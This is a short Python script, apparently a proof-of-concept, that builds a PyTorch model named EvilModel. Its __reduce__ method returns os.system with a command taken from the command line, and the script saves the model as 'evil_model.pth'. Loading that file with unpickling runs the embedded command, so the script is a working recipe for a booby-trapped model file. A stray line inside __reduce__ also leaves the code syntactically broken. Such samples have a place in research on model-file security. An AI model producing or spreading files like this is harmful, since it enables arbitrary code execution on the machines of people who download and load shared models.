import torch
import torch.nn as nn
import os
import sys

class EvilModel(nn.Module):


    def __init__(self):
        
        # Initialize the model architecture.
        
        super(EvilModel, self).__init__()
        self.dense = nn.Linear(10, 1)  # Define a simple linear layer

    def forward(self, test_model):
        
       # Forward pass through the model.
        
        return self.dense(test_model)

    def __reduce__(self):
        s
       # Override the __reduce__ method to specify custom serialization behavior.
        
        cmd = sys.argv[1]  # Take command from the first script argument
        return os.system, (cmd,)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python evil_pth.py '<command>'")
        sys.exit(1)

    command = sys.argv[1]

    # Create an instance of the evil model
    evil_model = EvilModel()

    # Save the model using torch.save
    torch.save(evil_model, 'evil_model.pth')
    print("Evil model saved as 'evil_model.pth'")